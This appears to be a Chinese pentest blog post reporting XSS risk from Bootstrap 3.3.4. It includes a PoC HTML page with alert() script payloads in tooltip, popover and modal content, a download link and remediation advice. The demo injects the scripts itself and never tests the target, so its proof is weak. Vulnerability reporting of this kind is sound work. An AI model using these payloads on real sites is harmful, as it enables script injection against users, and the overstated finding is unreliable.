---
title: 【Bootstrap】3.3.4版本过低导致XSS漏洞（中危）
date: 2025-09-09
categories:
  - 渗透测试
image: images/54.webp
---
# 漏洞URL
```
https://xxx/xx/xx/bootstrap/js/bootstrap.js
```
# 风险详情
```
攻击者利用脚本注入提供了“合法入口”（组件渲染逻辑未过滤 HTML 代码）。攻击门槛低，无需复杂技术，现成 payload 可直接利用。
```
# 漏洞证明
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250909143406.png)

本次对下载bootstrap.js文件进行漏洞分析，使用我用AI写的POC进行测试：
POC下载地址：
```
通过网盘分享的文件：Bootstrap-with-XSS-main.7z
链接: https://pan.baidu.com/s/1dO_x9WtgOVMtrCN4GC1sGA 提取码: ymyh 
--来自百度网盘超级会员v4的分享
```
test.html文件：
```
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bootstrap XSS 漏洞测试</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.3.4/dist/css/bootstrap.min.css">
    <script src="https://cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
    <!-- 使用本地下载的 bootstrap.js -->
    <script src="bootstrap.js"></script>
    <style>
        .container {
            margin-top: 50px;
        }
        .vulnerability-box {
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 20px;
            margin-bottom: 30px;
            background-color: #f9f9f9;
        }
        .vulnerability-title {
            color: #e74c3c;
            font-weight: bold;
            margin-bottom: 15px;
        }
        .btn-test {
            margin-right: 10px;
            margin-bottom: 10px;
        }
        .result {
            margin-top: 20px;
            padding: 15px;
            background-color: #f1f1f1;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="text-center">Bootstrap 3.3.4 XSS 漏洞测试</h1>
        <p class="text-center text-muted">本页面用于演示 Bootstrap 3.3.4 版本中存在的潜在 XSS 漏洞</p>

        <!-- 漏洞 1: Modal 组件的 load 方法 -->
        <div class="vulnerability-box">
            <h3 class="vulnerability-title">1. Modal 组件的 load 方法漏洞</h3>
            <p>Modal 组件的 remote 选项允许从远程 URL 加载内容，但没有进行任何过滤，可能导致 XSS 攻击。</p>
            <button class="btn btn-danger btn-test" id="testModal">测试 Modal XSS</button>
        </div>

        <!-- 漏洞 2: Tooltip 组件的 HTML 选项 -->
        <div class="vulnerability-box">
            <h3 class="vulnerability-title">2. Tooltip 组件的 HTML 选项漏洞</h3>
            <p>当 Tooltip 的 html 选项设置为 true 时，它会直接解析 HTML 内容，可能导致 XSS 攻击。</p>
            <button class="btn btn-danger btn-test" id="testTooltip" data-toggle="tooltip" title="普通文本提示">普通 Tooltip</button>
            <button class="btn btn-warning btn-test" id="testTooltipXss" data-toggle="tooltip" title="&lt;script&gt;alert('Tooltip XSS!')&lt;/script&gt;">HTML Tooltip (XSS)</button>
        </div>

        <!-- 漏洞 3: Popover 组件的 HTML 选项 -->
        <div class="vulnerability-box">
            <h3 class="vulnerability-title">3. Popover 组件的 HTML 选项漏洞</h3>
            <p>与 Tooltip 类似，Popover 的 html 选项也允许直接解析 HTML 内容，存在 XSS 风险。</p>
            <button class="btn btn-danger btn-test" id="testPopover" data-toggle="popover" data-content="普通 Popover 内容">普通 Popover</button>
            <button class="btn btn-warning btn-test" id="testPopoverXss" data-toggle="popover" data-content="&lt;script&gt;alert('Popover XSS!')&lt;/script&gt;">HTML Popover (XSS)</button>
        </div>

        <!-- 安全修复建议 -->
        <div class="vulnerability-box" style="background-color: #e8f4ea;">
            <h3 style="color: #27ae60;">安全修复建议</h3>
            <ul>
                <li><strong>禁用 Modal 的 remote 选项</strong>：不要使用 remote 选项从远程加载内容，而是手动获取内容并进行适当的过滤。</li>
                <li><strong>避免使用 html: true 选项</strong>：尽可能使用 text() 而不是 html() 来设置内容。</li>
                <li><strong>输入验证和过滤</strong>：对所有用户输入进行严格的验证和 HTML 转义。</li>
                <li><strong>升级到最新版本</strong>：Bootstrap 4+ 已经修复了许多旧版本中的安全问题。</li>
                <li><strong>使用内容安全策略(CSP)</strong>：设置适当的 CSP 头来防止 XSS 攻击。</li>
            </ul>
        </div>
    </div>

    <!-- 用于测试的 Modal -->
    <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
                    <h4 class="modal-title" id="myModalLabel">Modal 标题</h4>
                </div>
                <div class="modal-body">
                    模态框内容将从远程加载...
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-default" data-dismiss="modal">关闭</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        $(document).ready(function() {
            // 测试 Modal XSS
            $('#testModal').click(function() {
                // 创建一个包含 XSS 的临时内容用于测试
                var xssContent = '<div>这是加载的内容</div><script>alert("Modal XSS 测试成功!");<\/script>';
                
                // 直接设置内容用于演示
                $('#myModal .modal-body').html(xssContent);
                $('#myModal').modal('show');
            });

            // 初始化普通 Tooltip
            $('#testTooltip').tooltip();

            // 初始化 HTML Tooltip (XSS)
            $('#testTooltipXss').tooltip({
                html: true
            });

            // 初始化普通 Popover
            $('#testPopover').popover({
                trigger: 'hover',
                placement: 'top'
            });

            // 初始化 HTML Popover (XSS)
            $('#testPopoverXss').popover({
                trigger: 'hover',
                placement: 'top',
                html: true
            });
        });
    </script>
</body>
</html>
```

该版本存在3处XSS漏洞点：
1. Modal 组件的 load 方法漏洞：Modal 组件的 remote 选项允许从远程 URL 加载内容，但没有进行任何过滤，导致 XSS 攻击。
2. Tooltip 组件的 HTML 选项漏洞：当 Tooltip 的 html 选项设置为 true 时，它会直接解析 HTML 内容，导致 XSS 攻击。
3. Popover 组件的 HTML 选项漏洞：与 Tooltip 类似，Popover 的 html 选项也允许直接解析 HTML 内容，存在 XSS 风险。
## 测试方法
下载网站的`bootstrap.js`文件放在主目录中测试即可。
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250909143127.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250909143219.png)
# 漏洞修复
```
升级到最新版本：Bootstrap 4+ 已经修复了许多旧版本中的安全问题。
```